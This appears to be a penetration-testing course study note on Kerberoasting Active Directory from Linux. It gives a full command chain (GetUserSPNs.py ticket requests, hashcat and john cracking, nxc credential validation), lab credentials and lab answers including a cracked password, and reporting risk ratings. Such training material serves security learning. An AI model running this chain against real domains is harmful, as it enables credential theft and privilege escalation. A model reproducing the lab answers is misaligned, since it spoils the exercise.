# Section 17 — Kerberoasting from Linux

---

## QUICK REFERENCE — Full Attack Chain

```bash
# STEP 1 — List SPN accounts (check MemberOf column for DA/privileged groups)
GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER

# STEP 2 — Request ticket for a specific target, save to file
GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER -request-user TARGET -outputfile target_tgs

# STEP 3a — Crack with Hashcat (RC4, most common)
hashcat -m 13100 target_tgs /usr/share/wordlists/rockyou.txt

# STEP 3b — If Hashcat OpenCL broken (common on VMs), use John instead
john target_tgs --wordlist=/usr/share/wordlists/rockyou.txt

# STEP 4 — Validate cracked creds
nxc smb DC_IP -u TARGET -p 'crackedpassword'
```
> Step 1 lists Service Principal Name (SPN) accounts without requesting tickets yet — check the `MemberOf` column first to prioritize. Step 2 requests a Ticket Granting Service (TGS) ticket for one account and saves it to a file. Always use `-outputfile` — never copy hashes from the terminal. Mode `13100` is RC4 Kerberos TGS in Hashcat.

---

## Lab Attack Chain (INLANEFREIGHT.LOCAL)

**Creds:** `forend` / `Klmcargo2` | **DC:** `172.16.5.5`

```bash
# 1. List all SPN accounts
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# 2. Spot SAPService → MemberOf: CN=Account Operators
#    Spot sqldev → MemberOf: CN=Domain Admins

# 3. Request SAPService ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapservice_tgs

# 4. Crack (Hashcat broken on this VM — use John)
john sapservice_tgs --wordlist=/usr/share/wordlists/rockyou.txt
# Result: !SapperFi2

# 5. Validate
nxc smb 172.16.5.5 -u SAPService -p '!SapperFi2'
```
> Step 1 lists all SPN accounts — read the `MemberOf` column before requesting anything. Prioritize accounts in privileged groups. Step 3 requests only the SAPService ticket. John is used here because Hashcat's OpenCL driver is broken on this lab VM — a common issue on virtual machines.

**Lab answers:**
- SAPService password: `!SapperFi2`
- SAPService group: `Account Operators`

---

## What Is Kerberoasting

Any domain user can request a Kerberos service ticket (Ticket Granting Service, or TGS) for any SPN account. The ticket is encrypted with that account's NTLM hash. You take it offline and crack it to get the cleartext password. No special privileges are needed.

**Minimum requirement:** Any valid domain user credential (cleartext, hash, or shell as domain user)

**Targets to prioritize (check MemberOf column):**
- Domain Admins members → instant DA if cracked
- Account Operators / Backup Operators → high-value privilege escalation
- MSSQL SPNs → sysadmin on SQL server → `xp_cmdshell` → code execution
- Accounts with old `PasswordLastSet` + `LastLogon: never` → forgotten service accounts with weak passwords

---

## GetUserSPNs.py Options

| Command | What It Does |
|---------|-------------|
| `GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER` | List SPN accounts only — no tickets |
| `... -request` | Request tickets for ALL SPN accounts |
| `... -request-user TARGET` | Request ticket for one account |
| `... -outputfile filename` | Save tickets to file (always use this) |

---

## Cracking

```bash
# Hashcat — RC4/etype 23 (most common, faster)
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt

# Hashcat — AES-128 / AES-256 (slower)
hashcat -m 19600 tgs_file /usr/share/wordlists/rockyou.txt
hashcat -m 19700 tgs_file /usr/share/wordlists/rockyou.txt

# John — fallback when Hashcat OpenCL is broken
john tgs_file --wordlist=/usr/share/wordlists/rockyou.txt
```
> Mode `13100` = RC4 encrypted TGS (starts with `$krb5tgs$23$`). Mode `19600` = AES-128, mode `19700` = AES-256. RC4 cracks much faster than AES — try to get RC4 tickets when possible. John auto-detects the format and works as a fallback when Hashcat has driver issues on VMs.

**Hash prefix tells you the type:**
- `$krb5tgs$23$*` = RC4 (etype 23) → Hashcat mode 13100
- `$krb5tgs$18$*` = AES-256 (etype 18) → Hashcat mode 19700

---

## Reporting Guidance

| Outcome | Risk |
|---------|------|
| Cracked ticket → DA member | Critical |
| Cracked ticket → non-privileged account | High |
| Tickets exist but none cracked | Medium |

**Always report even if you can't crack** — SPNs on privileged accounts is the finding. Strong passwords are a mitigating control, not a fix.

---

## Exam Notes

- Any domain user can run this — no special rights needed
- Always check `MemberOf` first — determines target priority
- Always use `-outputfile` — never rely on stdout for cracking
- Hashcat mode 13100 = RC4 TGS | John works when Hashcat OpenCL fails
- TGS tickets crack slower than NTLM — use rockyou first, not large lists
- MSSQL SPN crack → sysadmin access even without DA
- `Account Operators` = can create/modify most AD accounts, common priv esc group
